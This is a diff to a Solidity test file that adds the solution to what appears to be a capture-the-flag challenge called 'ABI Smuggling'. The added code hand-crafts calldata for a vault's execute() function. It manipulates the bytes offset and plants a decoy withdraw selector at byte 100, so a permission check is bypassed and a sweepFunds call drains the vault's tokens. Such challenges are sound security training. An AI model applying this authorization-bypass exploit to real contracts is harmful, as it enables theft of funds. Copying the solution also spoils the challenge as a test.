@@ -73,7 +73,35 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        // Build the real payload: sweepFunds(recovery, token)
+        bytes memory sweepCalldata = abi.encodeWithSelector(
+            SelfAuthorizedVault.sweepFunds.selector,
+            recovery,
+            IERC20(address(token))
+        );
+
+        // Craft smuggled calldata for execute(address, bytes)
+        //
+        // Layout:
+        // [0x00] 1cff79cd             execute() selector
+        // [0x04] vault address         target param (word 1)
+        // [0x24] 0x80                  offset to bytes data (word 2) - MANIPULATED (normally 0x40)
+        // [0x44] 0x00...00             padding (word 3, fills bytes 68-99)
+        // [0x64] d9caed12 00...00      DECOY: withdraw selector at byte 100 (passes permission check)
+        // [0x84] length                length of real actionData
+        // [0xa4] 85fb709d ...          REAL PAYLOAD: sweepFunds calldata
+        bytes memory smuggledCalldata = abi.encodePacked(
+            bytes4(0x1cff79cd),                         // execute() selector
+            uint256(uint160(address(vault))),            // target = vault
+            uint256(0x80),                               // offset = 0x80 (skip past decoy)
+            uint256(0),                                  // padding
+            bytes32(bytes4(0xd9caed12)),                 // DECOY: withdraw selector at byte 100
+            uint256(sweepCalldata.length),               // length of real actionData
+            sweepCalldata                                // sweepFunds(recovery, token)
+        );
+
+        (bool success,) = address(vault).call(smuggledCalldata);
+        require(success, "Attack failed");
     }
 
     /**
